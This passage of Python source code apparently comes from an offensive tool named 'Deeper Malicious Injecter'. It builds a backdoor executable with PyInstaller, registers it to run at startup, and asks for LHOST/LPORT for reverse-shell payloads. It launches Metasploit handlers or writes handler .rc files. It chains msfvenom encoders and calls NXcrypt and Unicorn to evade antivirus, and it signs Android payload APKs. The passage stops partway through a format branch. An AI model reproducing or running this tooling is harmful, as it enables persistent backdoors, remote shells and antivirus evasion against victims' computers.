                'Writing RT_GROUP_ICON 0 resource with 76 bytes','21711 INFO: Writing RT_ICON 1 resource with 1128 bytes',\
                'Writing RT_ICON 2 resource with 2440 bytes','Writing RT_ICON 3 resource with 4264 bytes',\
                'Updating manifest in '+Backdoor_Path+'run.exe.x4lsa3jf','hooks Autorun Startup',\
                'hooks Code '+ hooks_Autorun,'hooks' +hooks_Autorun1]


                for i in Msg:
                    with yaspin(text=i) as sp:
                        sleep(0.55)
                        sp.green.ok("✔")


                
                swirl = yaspin(
                spinner=Spinners.simpleDotsScrolling,
                text=astg+" Building EXE BackDoor  ",
                color="red",
                side="right",
                sigmap={signal.SIGINT: fancy_handler},
                )

                with swirl as sp:
                    Command = 'wine /root/.wine/drive_c/Python34/Scripts/pyinstaller.exe --onefile --noconsole --icon={} {} 2>/dev/null '.format(Icon,Backdoor_File)
                    cmd(Command)

                    sp.green.ok("✔")


                # get backdoor from dist and remove folders
                print()
                print("""
    +------------++-------------------------++-------+                                        
    | Name       ||       Descript                  ||                                                     
    +------------++-------------------------++-------+                                        
    | Payload    ||  {}                                                      
    | AutoRun    ||  Run Automatically At Startup                                                              
    | OUTPUTNAME ||  dist/Backdoor.exe     
    | Icon       ||  {} 
    +------------++-------------------------++-------+ """.format(payload,Icon))
    

    def Style(self):
        CODE_BANNERCN = '['+Fore.GREEN+'<>'+Style.RESET_ALL+"]  "+Fore.LIGHTCYAN_EX+' CodeName: '+Style.RESET_ALL+":"+Fore.LIGHTRED_EX+"HACkCrX"+Style.RESET_ALL+'                   ['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"
        CODE_BANNER = '['+Fore.GREEN+'<>'+Style.RESET_ALL+"]   "+Fore.LIGHTCYAN_EX+'        Created By'+Style.RESET_ALL+":"+Fore.LIGHTRED_EX+'  AhmedBalaha'+Style.RESET_ALL+'     ['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"
        CODE_BANNERV = '['+Fore.GREEN+'<>'+Style.RESET_ALL+"]  "+Fore.LIGHTCYAN_EX+'         Version'+Style.RESET_ALL+":"+Fore.LIGHTRED_EX+'  4.1.0'+Style.RESET_ALL+'              ['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"
        

        
        #Code_BA3 = r'(___._/  \_.___)'
        Code_BA1 = '['+Fore.GREEN+'<>'+Style.RESET_ALL+']'+'._______________________________________'+'['+Fore.GREEN+'<>'+Style.RESET_ALL+"]" 
        Code_BA2 = '['+Fore.GREEN+'<>'+Style.RESET_ALL+']'+Fore.LIGHTRED_EX+'\_.----------------------------------._/'+'['+Fore.GREEN+'<>'+Style.RESET_ALL+"]" 
        GithubA = '['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"+r'      Follow Me On Github:' +Fore.LIGHTRED_EX+" @HACkCrX"+Style.RESET_ALL+'     ['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"
        FB = '['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"+r'         FB:' +Fore.LIGHTRED_EX+"   FB/ahmedbalaha115/"+Style.RESET_ALL+'       ['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"
        P = '['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"+r'      Select An Option To Begin'+   '         ['+Fore.GREEN+'<>'+Style.RESET_ALL+"]"
        

    


        PLANET01 = Fore.RED+"""

        ,MMM8&&&.
    _...MMMMM88&&&&..._
 .::'''MMMMM88&&&&&&'''::.
::     MMMMM88&&&&&&     ::
'::....MMMMM88&&&&&&....::'
   `''''MMMMM88&&&&''''`
         'MMM8&&&'     Hack The Planet
        """+Style.RESET_ALL

        Dv = Fore.LIGHTRED_EX+'v'+Style.RESET_ALL
        DEVIL = """
              {}
        (__){} | {}
        /\/\\_|_/                
       _\__/  |                  {}
      /  \/`\<`)                 {}
      \ (  |\_/                  {}
      /)))-(  |                  {}
     / /^ ^ \ |                  {}
    /  )^/\^( |                  {}
    )_//`__>> |                  {}     
      #   #`  |                  {}

        """.format(Dv,Dv,Dv,CODE_BANNERCN,CODE_BANNER,CODE_BANNERV,GithubA,FB,P,Code_BA1,Code_BA2)
        
        hackthep = G+"""
        _.---**""**-.       
._   .-'           /|`.     
 \`.'             / |  `.   
  V              (  ;    \  
  L       _.-  -. `'      \ 
 / `-. _.'       \         ;
:            __   ;    _   |
:`-.___.+-*"': `  ;  .' `. |
|`-/     `--*'   /  /  /`.\|
: :              \    :`.| ;
| |   .           ;/ .' ' / 
: :  / `             :__.'  
 \`._.-'       /     |      
  : )         :      ;      
  :----.._    |     /       
 : .-.    `.       /        
  \     `._       /         
  /`-            /          
 :             .'           
  \ )       .-'             
   `-----*"'     [bug]
  """
  

        Seclogin_w = Fore.LIGHTRED_EX +Back.BLUE+'Deeper Malicious Injecter $1 '+Style.RESET_ALL
        Seclogin_u = Fore.RED+'Deeper MI$'+Style.RESET_ALL
        Seclogin_p = Fore.RED+'hooks Malicious......'+Style.RESET_ALL
        Seclogin_c = 'Injecteing...'+' ['+Fore.LIGHTGREEN_EX+' OK'+Style.RESET_ALL+' ]'
        Seclogin_l = 'Hack System '+'[ '+Fore.LIGHTGREEN_EX+' Successfully'+Style.RESET_ALL+' ]'
        Seclogin_e = 'SYStem: '+Fore.LIGHTYELLOW_EX+ 'Linux'+Style.RESET_ALL+' :es4 '+Fore.LIGHTRED_EX+ '0xx0x'+Style.RESET_ALL+' Kernal:'+Fore.YELLOW+' fffff0xfx0'+Style.RESET_ALL

        Seclogin = """

{}
        {}
        {}
{}
{}
{}



""".format(Seclogin_w,Seclogin_u,Seclogin_p,Seclogin_c,Seclogin_l,Seclogin_e)

        #print(PLANET01)


        Hckcr = Fore.LIGHTRED_EX+"""                              
                       ./ymM0dayMmy/.                          
                    -+dHJ5aGFyZGVyIQ==+-                    
                `:sm⏣~~Destroy.No.Data~~s:`                
             -+h2~~Maintain.No.Persistence~~h+-              
         `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
      ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
   -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
  -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
  :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
  :we're.all.alike'`                     The.PFYroy.No.D7:  
  :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
  :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
  :---srwxrwx:-.`                        `MS146.52.No.Per:    
  :<script>.Ac816/                        sENbove3101.404:    
  :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
  :09.14.2011.raid                       /STFU|wall.No.Pr:    
  :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
  :#OUTHOUSE-  -s:                       /corykennedyData:    
  :$nmap -oS                              SSo.6178306Ence:    
  :Awsm.da:                            /shMTl#beats3o.No.:    
  :Ring0:                             `dDestRoyREXKC3ta/M:    
  :23d:                               sSETEC.ASTRONOMYist:                      
    """+Style.RESET_ALL
        na = Fore.LIGHTRED_EX+'Deeper'+Style.RESET_ALL
        Px1 = Fore.LIGHTRED_EX + 'Select An Option To Begin'+Style.RESET_ALL
        Bx1w = Fore.LIGHTGREEN_EX+'       hooks Malicious...'+Fore.RED+'Injecteing Deeper'+Fore.YELLOW+' hooks'+Fore.LIGHTRED_EX+'.....'+Fore.CYAN+' [DONE]'+Style.RESET_ALL
        Ver = '['+Fore.RED+'<>'+Style.RESET_ALL+']'+'Version'+'['+Fore.RED+'<>'+Style.RESET_ALL+']' +Fore.LIGHTGREEN_EX+' 4.2.0'+Style.RESET_ALL
        Code_BA3 = r'(____._/{}\_.____)'.format(na)
        Bx1 = """
                   {}
 ______________________________________________________________________________
|                                                                              |
| {}                 |
|______________________________________________________________________________|

        {}
        {}
        """.format(Px1,Bx1w,Ver,Code_BA3)

        BX2 = Fore.LIGHTMAGENTA_EX +"""
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
$$$$$$$$$$$$$$$$$$$$$D E E P E R $$$$$$$$$$$$$$$$$$$$$$$$$
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
**********************************************************
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
        """+Style.RESET_ALL



        Bx3 ="Deeper , System Hacking Interface\nVersion 4.0.5, Alpha E\nReady..."
        Bx3+='\n'+Fore.RED+'>'+Style.RESET_ALL+' access Deeper'
        Bx3+='\n'+'access:'+Fore.LIGHTRED_EX+' PERMISSION DENIED.'+Style.RESET_ALL
        Bx3+='\n'+Fore.RED+'> '+Fore.LIGHTMAGENTA_EX+'ldaccess Deeper grid'+Style.RESET_ALL
        Bx3+='\n'+'access:'+Fore.LIGHTRED_EX+' PERMISSION DENIED.'+Style.RESET_ALL
        Bx3+='\n'+Fore.RED+'> '+Fore.LIGHTMAGENTA_EX+'access main Deeper grid'+Style.RESET_ALL
        Bx3+='\n'+'access:'+Fore.LIGHTRED_EX+' PERMISSION DENIED.'+Style.RESET_ALL
        Bx3+='\n'+'access main Deeper using chain method <<\\Deeper>>'
        Bx3+='\n'+'access:'+Fore.LIGHTRED_EX+' PERMISSION DENIED.'+Style.RESET_ALL
        Bx3+='\n'+Fore.LIGHTRED_EX+'.........XXXXXXXXXXXXXXXXXXXXX.........'+Style.RESET_ALL


  
  
  
        b7 = Fore.LIGHTMAGENTA_EX+ """

  █ 🚬██ ▄▄▄▄▄▃        
..▂▄▅█████▅▄▃▂              01000001 01010011 01010111  
[███████████████            01110000 01110100 01100101
 ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙⊙▲⊙
                            version 4.1.0

        """+Style.RESET_ALL


        b3 = Fore.LIGHTCYAN_EX+ """      
 __  __               \           _______ _                  .___   .                         .   
 |   |    ___    ___  |   ,      '   /    /        ___       /   \  |     ___  , __     ___  _/_  
 |___|   /   ` .'   ` |  /           |    |,---. .'   `      |,_-'  |    /   ` |'  `. .'   `  |   
 |   |  |    | |      |-<            |    |'   ` |----'      |      |   |    | |    | |----'  |   
 /   /  `.__/|  `._.' /  \_          /    /    | `.___,      /     /\__ `.__/| /    | `.___,  \__/
                                                                                                  
        
    """+Style.RESET_ALL
       


       
        b5s = Fore.RED+'>'+Style.RESET_ALL+' Shell'+Style.RESET_ALL
        b5v = Fore.RED+'>'+Style.RESET_ALL+' Version'+Fore.GREEN+' 4.1.0 '+Style.RESET_ALL
        b5g = Fore.RED+'>'+Style.RESET_ALL+' Follow Me On Github:'+Fore.GREEN+' @HACkCrX '+Style.RESET_ALL
        b5c = Fore.RED+'>'+Style.RESET_ALL+' Created By :'+Fore.GREEN+' AhmedBalaha'+Style.RESET_ALL
        b5op = Fore.RED+'>'+Style.RESET_ALL+' Select An Option To Begin'+Style.RESET_ALL
        b5ln = "["+Fore.CYAN+'#'+Style.RESET_ALL+"]"+ ' EX:0R Mode'+Fore.YELLOW+' Asert'+Fore.RED+' < '+Style.RESET_ALL+'Set [' +Fore.CYAN+'#'+Style.RESET_ALL+"]"
        ar1 = Fore.RED+'>'+Style.RESET_ALL
        ar2 = Fore.RED+'<'+Style.RESET_ALL

        b5 = Style.RESET_ALL+"""
        |--------------------------------|
        | {}                        |
        | {}               |
        | {}|
        | {}     |
        | {}    |
        | {} Deeper Main Menu Shell       | 
        | {}    (___._/  \_.___)   {}      |
        |                                |
        | {} |
        ----------------------------------
        """.format(b5s,b5v,b5g,b5c,b5op,ar1,ar1,ar2,b5ln)


        banners = [PLANET01,DEVIL,hackthep,Seclogin,Hckcr,Bx1,Bx3,b7,b3,b5]
        print(random.choice(banners))
        
        
        
       
        


    def Get_addr_Info(self):
        global s
        global local_ip
        global pupip
        site = "http://whatismyip.host/my-ip-address-details"
        req = urllib.request.Request(site, headers={'User-Agent': 'Mozilla/5.0'})
        url = urllib.request.urlopen(req)
        # except urllib.error.URLError:
        # print('error')
        sitereader = url.read()
        pupip = []
        soup = BeautifulSoup(sitereader, 'html.parser')
        for i in soup.findAll('p', {"class": "ipaddress"}):
            i = i.text
            pupip.append(i)

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::




    def Ofline_Connection(self):
        cmd("clear")
        global  LHOST , LPORT , Pay_Name ,chost ,cport

        LHOST = input(astg+" Insert lhost -> ")
        LPORT = input(astg+" Inset lport -> ")

        while True:
            Pay_Name = input(astg+" Enter Base Name oF Payload : ")
            if "." in Pay_Name:
                Pay_Name = Pay_Name.split('.')[0]

            elif Pay_Name == "":
                continue
            break;



        cport = colored(LPORT, 'red')
        chost = colored(LHOST,'red')


    def Onlin_Connection(self):
        global  chost , cport ,Pay_Name , LHOST ,LPORT
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
            s.close()
        except OSError:
            print(w, 'No Internet Connection')
            sys.exit()



        cmd("clear")
        def Loop():
            for i in range(48):
                print(bg+'+', end="")
                sys.stdout.flush()
                sleep(0.007)

        cmd("clear")
        Loop()
        print()
        pub = qu + colored(' {} Use Public IP As LHOST? [Y/N] '.format(puplic_IP), 'white')
        try:
            while True:
                addr = str(input(pub).lower())
                if addr == "y" or addr == "yes":
                    host = puplic_IP
                    break;


                elif addr == "n" or addr == "no":
                    cmd('clear')
                    Loop()
                    print()
                    # print(qu, sep="", end="")
                    while True:
                        local = qu + colored(' {} Use This As LHOST [Y/N] '.format(local_ip), 'white')
                        addr = str(input(local).lower())

                        if addr == "y" or addr == "yes":
                            host = local_ip

                            break;


                        elif addr == "n" or addr == "no":
                            cmd("clear")
                            Loop()
                            print('')
                            # print(qu, sep="", end="")
                            while True:
                                ca = qu + colored(' Address For Listener : ', 'white')
                                addr = input(ca)
                                if addr.count(".") == 3:
                                    host = addr

                                    break;

                                else:
                                    continue


                        else:
                            continue

                        break

                else:
                    continue

                break

            cmd("clear")
            Loop()
            print('')
            while True:
                pc = qu + colored(' 4444 Use This As LPORT [Y/N] ', 'white')
                port = str(input(pc)).lower()
                if port == "":
                    continue

                elif port == "y" or port == "yes":
                    port = 4444
                    break

                elif port == "n" or port == "no":
                    cmd("clear")
                    Loop()
                    print()
                    cpo = astg + colored(" LPORT -> ", 'white')
                    while True:
                        try:
                            port = int(input(cpo))
                        except ValueError:
                            continue
                        else:
                            break
                break


            cport = colored(port, 'red')
            chost = colored(host, 'red')
            LHOST = host
            LPORT = port
            print("\n")

            cmd("clear")
            self.PosTive_Loop()

            while True:

                print()
                c = astg +" Enter Base Name oF Payload : "
                Pay_Name = input(c)
                if "." in Pay_Name:
                    Pay_Name = Pay_Name.split('.')[0]

                elif Pay_Name == "":
                    continue
                break;



        except KeyboardInterrupt:
            print()
            print(Ok,white+"Detecting [CTRL+C] Quiting.... ", end="")
            print()
            sys.exit()


#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

    def Get_Socket_Info(self):
        global LPORT ,LHOST ,chost, cport, Pay_Name ,puplic_IP
        site = "http://whatismyip.host/my-ip-address-details"
        req = urllib.request.Request(site, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            url = urllib.request.urlopen(req)
            sitereader = url.read()
            pupip = []
            soup = BeautifulSoup(sitereader, 'html.parser')
            for i in soup.findAll('p', {"class": "ipaddress"}):
                i = i.text
                pupip.append(i)
                puplic_IP=pupip[0]
            self.Onlin_Connection()
        except urllib.error.URLError:
            sleep(2)
            #print(nok, 'No Internet Connection')
            #input(warning+' Some Function Will Not Work \nPress [Enter] To Continue ..... ')
            self.Ofline_Connection()



        except KeyboardInterrupt:
            print()
            print(Ok,white+"Detecting [CTRL+C] Quiting.... ", end="")
            print()
            sys.exit()

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# Python Payload Function
    def Python_Payload_Get_Socket_Info(self):
        global LPORT ,LHOST ,chost, cport ,puplic_IP
        site = "http://whatismyip.host/my-ip-address-details"
        req = urllib.request.Request(site, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            url = urllib.request.urlopen(req)
            sitereader = url.read()
            pupip = []
            soup = BeautifulSoup(sitereader, 'html.parser')
            for i in soup.findAll('p', {"class": "ipaddress"}):
                i = i.text
                pupip.append(i)
                puplic_IP=pupip[0]
            self.python_Payload_Online_Connection()
        except urllib.error.URLError:
            sleep(2)
            #print(nok, 'No Internet Connection')
            #input(warning+' Some Function Will Not Work \nPress [Enter] To Continue ..... ')
            self.Python_Payload_Ofline_Connection()





    def Python_Payload_Ofline_Connection(self):
        cmd("clear")
        global  LHOST , LPORT,chost ,cport

        LHOST = input(astg+" Insert lhost -> ")
        LPORT = input(astg+" Inset lport -> ")



        cport = colored(LPORT, 'cyan')
        chost = colored(LHOST,'cyan')

    def Python_Pay_INFO(self, Host, Port,output):
        global Counter
        

        Counter = None
        print(colored("Payload Information", 'cyan'))
        print("""
+------------++-------------------------++-----------------------+                                        
| Name       ||  Descript               || Input                                                     
+------------++-------------------------++-----------------------+                                        
| LHOST      ||  The Listen Addres      || {}                                                   
| LPORT      ||  The Listen Ports       || {}                                                           
| OUTPUTNAME ||  The Filename output    || {}                                                        
+------------++-------------------------++-----------------------+        
            """.format(chost,cport,output))
    
        Counter = 1


    def python_Payload_Online_Connection(self):
        global  chost , cport , LHOST ,LPORT
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))
            local_ip = s.getsockname()[0]
            s.close()
        except OSError:
            print(w, 'No Internet Connection')
            sys.exit()


        local_ip = puplic_IP
        cmd("clear")
        def Loop():
            for i in range(48):
                print(bg+'+', end="")
                sys.stdout.flush()
                sleep(0.007)

        cmd("clear")
        Loop()
        print()
        pub = qu + colored(' {} Use This IP As LHOST? [Y/N] '.format(puplic_IP), 'white')
        try:
            while True:
                addr = str(input(pub).lower())
                if addr == "y" or addr == "yes":
                    host = puplic_IP
                    break;


                elif addr == "n" or addr == "no":
                    cmd('clear')
                    Loop()
                    print()
                    # print(qu, sep="", end="")
                    while True:
                        local = qu + colored(' {} Use This As LHOST [Y/N] '.format(local_ip), 'white')
                        addr = str(input(local).lower())

                        if addr == "y" or addr == "yes":
                            host = local_ip

                            break;


                        elif addr == "n" or addr == "no":
                            cmd("clear")
                            Loop()
                            print('')
                            # print(qu, sep="", end="")
                            while True:
                                ca = qu + colored(' Address For Listener : ', 'white')
                                addr = input(ca)
                                if addr.count(".") == 3:
                                    host = addr

                                    break;

                                else:
                                    continue


                        else:
                            continue

                        break

                else:
                    continue

                break

            cmd("clear")
            Loop()
            print('')
            while True:
                pc = qu + colored(' 4444 Use This As LPORT [Y/N] ', 'white')
                port = str(input(pc)).lower()
                if port == "":
                    continue

                elif port == "y" or port == "yes":
                    port = 4444
                    break

                elif port == "n" or port == "no":
                    cmd("clear")
                    Loop()
                    print()
                    cpo = astg + colored(" LPORT -> ", 'white')
                    while True:
                        try:
                            port = int(input(cpo))
                        except ValueError:
                            continue
                        else:
                            break
                break


            cport = colored(port, 'red')
            chost = colored(host, 'red')
            LHOST = host
            LPORT = port
            print("\n")

            cmd("clear")
            #self.PosTive_Loop()



        except KeyboardInterrupt:
            print()
            print(Ok,white+"Detecting [CTRL+C] Quiting.... ", end="")
            print()
            sys.exit()







    def Create_Listener(self):
        lis = qu +white+' Create Listener [Y/N] : '
        while True:
            Listener = str(input(lis))
            if Listener.lower() == "":
                continue

            if Listener.lower() == "y" or Listener.lower() == "yes":
                print()
                print(astg,white+'Happy Hunting !!')
                cmd(
                    "xterm -fg green  -bg black -fa 'Monospace' -fs 11 -e msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {};set ExitOnSession false; run; exit -y' &".format(
                        payload, LHOST, LPORT))
                break

            elif Listener.lower() == "n" or Listener.lower() == "no":

                Date = str(gmtime()[0:3]).replace(', ', '_').strip('()')

                # TR
                ########################################
                def Hand():
                    a = 0
                    while a < 6:
                        print(green+".", end="")
                        a = 1
                        sys.stdout.flush()
                        sleep(0.017)

                ######################################
                # Export rc Fils 
                cmd("clear")
                self.PosTive_Loop()
                print("\n")
                print(Ok,white+'Export -> rc File ', end="")
                print(sep="", end="".format(self.Wait()))
                rc = "Handler_{}.rc".format(Date)
                Rc_Path = Current_Dir + "/" + rc
                if os.path.isfile(Rc_Path) == True:
                    rand_num = random.randrange(100)
                    rc = "Handler{}_{}.rc".format(rand_num, Date)
                    
                    
                elif os.path.isfile(Rc_Path)==False:
                    rc = "Handler_{}.rc".format(Date)


                RC_FILE = open(rc, 'w')
                RC_FILE.write(
                    'use exploit/multi/handler\nset payload {}\nset LHOST {}\nset LPORT {}\nset ExitOnSession false\nexploit -j'.format(
                        payload, LHOST, LPORT))
                RC_FILE.close

                sleep(2)
                global SAVEL
                SAVEL = Current_Dir + "/Handler_{}.rc".format(Date)
                print("\n")
                print(astg,white+'File Save As :', Current_Dir+'/'+rc)
                print()
                print(astg,white+"Use msfconsole -r {}".format(rc))
                print()
                print(Ok,white+"Happy Hunting !!! ")
                print()
                print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
                break







    def Evading_Antivirus_Main(self):
        cmd('clear')
        print()
        print('[ 1 ]-[Evading Using Msfvenome Encoder Chain] ')
        print('[ 2 ]-[Evading Using NXcrypt Work With py2] ')
        print('[ 3 ]-[Evading Using Unicorn] ')
        print()
        SHELL = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Payloads'+G+"]: "
        Ch = int(input(SHELL))

        if Ch==1:
            self.Evading_Antivirus_Msfvenome_Encoder_Chain()

        elif Ch==2:
            cmd('clear')
            print(astg,'Insert Payload Path')
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'NXcrypt'+G+"]: ",end="");payload = input()

            print(astg,'Insert output file name')
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'NXcrypt'+G+"]: ",end="");outf = input()
            if 'py' not in outf:
                outf+='.py'
            else:
                outf = outf

            cmd('clear')
            cmd('python Tools/NXcrypt.py -f {} -o {}'.format(payload,outf))


            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()

        elif Ch==3:
            print(astg,'Target  ======> Windows')
            print(astg,'Payload ======> windows/meterpreter/reverse_tcp  ')
            print()

            print(astg,'Insert ip')
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'unicorn'+G+"]: ",end="");ip = input()

            print(astg,'Insert Port')
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'unicorn'+G+"]: ",end="");port = input()

            cmd('python3 Tools/unicorn/unicorn.py windows/meterpreter/reverse_tcp {} {}'.format(ip,port))

            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()


        
        







    def Evading_Antivirus_Msfvenome_Encoder_Chain(self):
        cmd('clear')
        print(Fore.CYAN+"""                                                            
 ____ ____ ____ ____ ____ ____ ____ _________ ____ ____ ____ ____ ____ 
||E |||n |||c |||o |||d |||e |||r |||       |||C |||h |||a |||i |||n ||
||__|||__|||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|/__\|
"""+Style.RESET_ALL)
        arw = '----'+Fore.RED+'>'+Style.RESET_ALL
        dot = Fore.LIGHTRED_EX+':'+Style.RESET_ALL
        print()
        print()
        print('[01]{}  {}[Windows]'.format(arw,dot))
        print('[02]{}  {}[Linux]'.format(arw,dot))
        print('[03]{}  {}[Mac]'.format(arw,dot))
        print('[04]{}  {}[Android]'.format(arw,dot))
        print('[05]{}  {}[Bash]'.format(arw,dot))
        print('[06]{}  {}[Perl]'.format(arw,dot))
        print('[07]{}  {}[Python]'.format(arw,dot))
        print('[08]{}  {}[Java]'.format(arw,dot))
        print('[09]{}  {}[PHP]'.format(arw,dot))
        print('[10]{}  {}[Asp]'.format(arw,dot))
        print('[11]{}  {}[Ruby]'.format(arw,dot))


        
        global payload , rc 
        print()

        SHELL = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'EncoderChain'+G+"]: "
        Ch = int(input(SHELL))

        if Ch==1:
            Payloads.Win_Payloads()
            Payloads.Payloads
            Format = 'exe'
            Platform = 'windows'
            Arc = 'x86'

        elif Ch==2:
            Payloads.Linux_Payloads()
            Payloads.Payloads
            Format = "linux"
            Platform = 'linux'
            Arc = 'x86'

        elif Ch==3:
            Payloads.Osx_Payloads()
            Payloads.Payloads
            Format = 'macho'
            Platform = 'mac'
            Arc = 'x86'

        elif Ch==4:
            Payloads.Android_Payloads()
            Payloads.Payloads
            Platform = 'android'
            Arc = "dalvik"
            Format = 'apk'

        elif Ch==5:
            Payloads.Bash_payload()
            Payloads.Payloads
            Format = 'sh'
            Platform = 'bash'
            Arc = 'x86'



        elif Ch==6:
            Payloads.Perl_Payloads()
            Payloads.Payloads
            Format = 'pl'
            Platform = 'perl'
            Arc = 'x86'

        elif Ch==7:
            Payloads.Ruby_Payloads()
            Payloads.Payloads
            Format = 'rb'
            Platform = 'ruby'
            Arc = 'x86'

        elif Ch==8:
            Payloads.Python_Payloads()
            Payloads.Payloads
            Format = 'py'
            Platform = 'python'
            Arc = 'x86'

        elif Ch==9:
            Payloads.Php_Payloads()
            Payloads.Payloads
            Format = 'php'
            Platform = 'php'
            Arc = 'x86'

        elif Ch==10:
            Payloads.Asp_Payloads()
            Payloads.Payloads
            Format = 'asp'
            Platform = 'asp'
            Arc = 'x86'

        elif Ch==11:
            Payloads.Osx_Payloads()
            Payloads.Payloads
            Format = 'macho'
            Platform = 'mac'
            Arc = 'x86'

        # Setup Script
        


        while True:
            try:
                print()
                payload = int(input('>> '))
                print()

                if payload in range(1,len(Payloads.Payloads)+1):
                    break

                else:
                    continue

            except ValueError:
                continue

        payload = Payloads.Payloads[payload-1]
        self.Get_Socket_Info()
        arc = Arc
        En_shikata = 'x86/shikata_ga_nai'
        En_countdown = 'x86/countdown'
        iterations = 5
        RFormat = 'raw'
        Final_Format = Format
        badChars =  r'\x00\x0a\x0d'

        ###################################
        Payload = payload
        Host = LHOST
        Port = LPORT
        Payload_Name = Pay_Name
        Output = Pay_Name+'.'+Final_Format

     

        def Save_Location():
            global savel
            Pay_Name = Output
            savel = Current_Dir + '/{}'.format(Pay_Name )
            print(astg, 'File Save As : {}'.format(savel))
            print()
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
            cmd("clear")


        #print()
        #self.Evading_Antivirus_Msfvenome_Encoder_Info(Payload,Host,Port,En_shikata,En_countdown,arc,Output)
        #print()
        cmd('clear')
        global Counter
        Counter = None

        print("""
+------------++-------------------------++-----------------------+                                        
| Name       ||  Descript               || Your Input                                                     
+------------++-------------------------++-----------------------+                                        
| LHOST      ||  The Listen Addres      || {}                                                    
| LPORT      ||  The Listen Ports       || {}                                                           
| OUTPUTNAME ||  The Filename output    || {}                                                       
| PAYLOAD    ||  Payload To Be Used     || {}                           
+------------++-------------------------++-----------------------+           
            """.format(Host,Port,Output,payload))
        Counter = 1
                   

       

        
        if Final_Format=="apk":
            COMMAND = ('msfvenom -p {} LHOST={} LPORT={} -e {} -i {} | \
               msfvenom -a {} --platform {} -e {} -i {}  | \
               msfvenom -a {} --platform {} -e {} -i {} -b {} -o {}'.format(Payload,Host,Port,En_shikata,iterations,arc,Platform,En_countdown,iterations,arc,Platform,En_shikata,iterations,badChars,Output))

            ErrorLevel = cmd(COMMAND)
            if ErrorLevel !=0:
                print(warning,"Error Creating Payload ")
                sys.exit()

            else:
                try:
                    print(astg,'Create Certificate')
                    command = 'keytool -genkeypair  -alias androiddebugkey -keypass android -keystore debug.keystore -storepass android -dname "CN=Android Debug, O=Android,C=US" -validity 9999>/dev/null2>&1'
                    cmd(command)
                    sleep(1)
                    print(astg,'Signing {} '.format(Output),end=""),self.Wait()
                    command = 'keytool -list -alias androiddebugkey -keystore debug.keystore -storepass android -keypass  android>/dev/null2>&1'
                    cmd(command)
                    command = 'jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1  {} androiddebugkey>/dev/null2>&1'.format(
                        Output)
                    cmd(command)
                    sleep(1)
                    cmd('rm debug.keystore>/dev/null2>&1 ')
                    print('[Done]',end="")
                    print()
                except:
                    print(x,'Error Signing {}'.format(Output))
                    print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()





        elif Final_Format=="py" or Final_Format=="php" or Final_Format=='sh' or Final_Format=='pl' or Final_Format=='rb' or Final_Format=='jar'or Final_Format=='asp':
